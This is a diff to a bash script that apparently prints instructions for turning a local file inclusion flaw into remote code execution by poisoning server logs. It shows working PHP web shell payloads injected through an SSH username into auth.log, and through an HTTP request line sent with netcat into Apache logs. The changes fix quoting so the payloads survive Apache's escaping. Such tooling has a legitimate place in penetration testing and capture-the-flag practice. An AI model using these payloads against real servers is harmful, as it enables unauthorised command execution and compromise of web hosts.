@@ -267,14 +267,15 @@ for log in "${LOG_PATHS[@]}"; do
         case "$log" in
             *auth.log|*secure)
                 echo "      1) Poison auth.log with a failed SSH login (the username is logged):"
-                echo "         ssh '<?php system(\$_GET[\"${CMD_PARAM}\"]); ?>'@<target-ip>"
+                echo "         ssh \"<?php system(\\\$_GET['${CMD_PARAM}']); ?>\"@<target-ip>"
                 ;;
             *)
                 echo "      1) Poison via the REQUEST LINE with netcat (nc avoids URL-encoding"
                 echo "         the PHP tags). Send it to the web service whose log you're"
                 echo "         reading - usually PORT 80, which may NOT be the LFI app's port:"
-                echo "         nc -nv ${POISON_HOST} 80"
-                echo "         GET /<?php passthru(\$_GET[\"${CMD_PARAM}\"]); ?> HTTP/1.1"
+                echo "         echo \"GET /<?php passthru(\\\$_GET['${CMD_PARAM}']); ?> HTTP/1.1\" | nc -nv ${POISON_HOST} 80"
+                echo "         (Use SINGLE quotes in the payload: Apache escapes \" in the logged"
+                echo "          request line as \\\", which breaks PHP parsing; ' is left as-is.)"
                 echo "         (User-Agent poisoning via 'curl -A' only lands if Apache LogFormat"
                 echo "          is 'combined'; the request-line method also works with 'common'.)"
                 ;;
